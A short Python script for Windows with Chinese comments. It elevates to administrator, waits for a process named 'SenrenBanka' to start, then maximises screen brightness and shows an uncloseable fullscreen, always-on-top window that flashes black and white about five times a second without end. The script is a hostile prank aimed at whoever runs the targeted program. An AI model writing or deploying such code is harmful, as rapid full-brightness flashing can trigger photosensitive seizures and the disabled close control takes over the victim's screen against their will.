import ctypes
import os
import sys
import subprocess
import time
import psutil
import tkinter as tk

def is_admin():
    """检查当前用户是否为管理员"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """以管理员身份重新启动程序"""
    if not is_admin():
        print("请求管理员权限...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def set_max_brightness():
    """尝试将屏幕亮度设置为最高"""
    try:
        subprocess.run(["powershell", "-Command", "(Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1, 100)"], check=True)
    except Exception as e:
        print(f"设置亮度失败: {e}")

def create_fullscreen_window():
    """创建全屏窗口并闪烁黑白"""
    root = tk.Tk()
    root.attributes("-fullscreen", True)  # 全屏
    root.attributes("-topmost", True)  # 始终在最上方
    root.configure(bg='black')

    def flash_colors():
        """切换颜色"""
        while True:
            root.configure(bg='black')
            root.update()
            time.sleep(0.1)  # 闪烁频率快
            root.configure(bg='white')
            root.update()
            time.sleep(0.1)  # 闪烁频率快

    set_max_brightness()

    # 禁用关闭事件
    root.protocol("WM_DELETE_WINDOW", lambda: None)

    flash_colors()

    root.mainloop()

def is_game_running(game_name):
    """检查指定游戏是否在运行"""
    for process in psutil.process_iter(attrs=['name']):
        if game_name in process.info['name']:
            return True
    return False

if __name__ == "__main__":
    run_as_admin()  # 请求管理员权限

    # 监测指定程序
    game_name = "SenrenBanka"  # 监测包含此名称的进程
    while True:
        if is_game_running(game_name):
            create_fullscreen_window()  # 启动闪屏模式
            break  # 找到后跳出循环
        time.sleep(1)  # 每秒检查一次
